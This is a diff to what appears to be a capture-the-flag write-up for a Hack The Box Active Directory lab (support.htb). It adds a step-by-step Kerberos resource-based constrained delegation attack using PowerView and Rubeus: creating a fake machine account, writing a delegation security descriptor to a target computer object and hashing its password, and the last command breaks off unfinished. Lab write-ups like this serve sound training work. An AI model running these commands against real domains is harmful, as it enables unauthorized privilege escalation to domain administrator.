@@ -255,7 +255,7 @@ Getting user information on my name:
 
 Following TCP Stream on Wireshark from LDAP traffic (from UserInfo.exe):
 
-<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 * This is the cleartext request!
 
@@ -302,7 +302,7 @@ impacket-smbserver smb . -smb2support
 
 Transferring files to aid in enumeration:
 
-<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 adPEAS:
 
@@ -332,8 +332,68 @@ Definition:
 
 It's possible to gain code execution with elevated privileges on a remote computer if you have WRITE privilege on that computer's AD object.
 
+PowerView:
+
+Import PowerView:
+
+```
+ipmo .\PowerView
+```
+
+Rubeus:
+
+* Transfer Rubeus over to the Target machine
+
 ### Kerberos Resource-Based Constrained Delegation
 
+Steps:
 
+1. Create a new computer object
+
+```
+New-MachineAccount -MachineAccount fakehaha1 -Password $(ConvertTo-SecureString 'Password1' -AsPlainText -Force) -Verbose
+```
+
+&#x20;2\. Checking if the computer was created and obtaining SID:
+
+```
+Get-DomainComputer fakehaha1
+```
+
+SID: <mark style="color:yellow;">S-1-5-21-1677581083-3380853377-188903654-5602</mark>
+
+&#x20;3\. Create a new security desciptor for the fakehaha1 computer principal:
+
+```
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5602)"
+
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+
+$SD.GetBinaryForm($SDBytes, 0)
+```
+
+&#x20;4\. Now, we need to modify the target computer's AD object:
+
+```
+Get-DomainComputer ws01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+```
+
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+&#x20;5\. Now, we can generate the RC4 hash using Rubeus:
+
+```
+.\Rubeus.exe hash /password:Password1 /user:fakehaha1 /domain:support.htb
+```
+
+<figure><img src="../../../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>
+
+* It is labeled rc4\_hmac: <mark style="color:yellow;">64F12CDDAA88057E06A81B54E73B949B</mark>
+
+&#x20;6\. Impersonation- Now that we have the hash, we can now attempt to execute the attack by requesting a Kerberos ticket for fakehaha1 with ability to impersonate Administrator:
+
+```
+.\Rubeus.exe 
+```
 
 ## Proofs
